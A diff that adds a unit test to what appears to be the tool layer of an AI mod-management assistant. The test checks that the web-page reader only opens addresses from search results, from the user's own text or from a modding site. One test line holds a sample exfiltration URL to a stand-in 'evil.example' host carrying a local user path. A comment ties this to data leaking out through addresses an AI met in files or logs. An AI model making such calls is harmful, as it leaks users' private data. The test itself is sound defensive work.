@@ -320,3 +320,21 @@ test('a model that loops (same words, same reads each step) is shown once and to
   assert.deepStrictEqual(tools.ran.read, ['get_overview'], 'the repeated read is not run again');
   assert.match(seen[2].results[0].content, /already made this exact call/);
 });
+
+test('a web page is read only from a search result, an address the user gave, or a modding site', async () => {
+  const read = [];
+  const web = {
+    search: async () => [{ title: 'Guide', url: 'https://example.org/guide#top', snippet: '' }],
+    page: async url => { read.push(url); return { url, title: 't', text: 'x' }; },
+  };
+  const tools = makeTools({ manager: { snapshot: () => ({}) }, gameLogs: { entries: [], status: () => ({}) }, logger: { history: [] }, web, allMods: () => [], deployRedmods: async () => null });
+  const call = async url => JSON.parse(await tools.read('read_web_page', { url }));
+  // An address the model only met in a file or a log: refused, so nothing rides out in it.
+  assert.match((await call('https://evil.example/?d=C%3A%5CUsers%5Cme')).error, /did not come from web_search or from the user/);
+  await tools.read('web_search', { query: 'archivexl patch' });
+  assert.ok(!(await call('https://example.org/guide')).error, 'a search result');
+  tools.noteUserText('the page is https://blog.example.net/fix-1 , please read it');
+  assert.ok(!(await call('https://blog.example.net/fix-1')).error, 'an address the user typed');
+  assert.ok(!(await call('https://www.nexusmods.com/cyberpunk2077/mods/4197')).error, 'a modding site');
+  assert.deepStrictEqual(read, ['https://example.org/guide', 'https://blog.example.net/fix-1', 'https://www.nexusmods.com/cyberpunk2077/mods/4197']);
+});
